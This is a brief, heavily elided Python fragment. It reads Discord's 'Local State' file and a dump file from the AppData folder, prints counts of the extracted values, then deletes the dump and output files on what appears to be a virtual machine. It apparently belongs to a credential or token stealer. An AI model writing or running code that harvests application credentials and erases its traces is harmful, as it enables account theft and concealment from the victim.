...
file_path = rf"{home}\AppData\Roaming\discord\dump.txt"
...
# RUN EVERYTHING
# ----------------------------
txt_vals = extract_txt("dump.txt")
json_vals = extract_json("Local State")  # no .json needed
...
# DEBUG OUTPUT
# ----------------------------
print("TXT found:", len(txt_vals))
print("JSON found:", len(json_vals))
print("Output written:", len(final))
...
Path("C:\Users\\vboxuser\AppData\Roaming\discord\dump.txt").unlink()
Path("C:\Users\\vboxuser\AppData\Roaming\discord\output.json").unlink()
